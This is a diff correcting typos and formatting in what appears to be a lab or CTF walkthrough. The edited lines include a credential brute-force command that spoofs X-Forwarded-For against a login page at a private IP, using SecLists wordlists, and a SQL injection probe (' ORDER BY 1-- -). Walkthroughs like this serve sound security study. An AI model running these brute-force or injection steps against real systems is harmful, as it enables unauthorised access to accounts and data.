@@ -18,7 +18,7 @@ for i in range(256):
         print(response.text[:300])
     else:
         print(f"[+] {ip}, status: {response.status_code}")
-         print(response.text[:300])
+        print(response.text[:300])
 
 ```
 
@@ -187,7 +187,7 @@ if __name__ == "__main__":
 
 ```
 
-> python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "/usr/share/seclists/Usernames/top-usernames-shortlist.txt --passwords" "/usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000.txt"
+> python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" --passwords "/usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000.txt"
 
 - It shows all 200 status code
 
@@ -270,7 +270,7 @@ if __name__ == "__main__":
 
 > ' ORDER BY 1-- -
 
-## check colume count -> 4
+## check column count -> 4
 
 > ' ORDER BY 1-- -
 
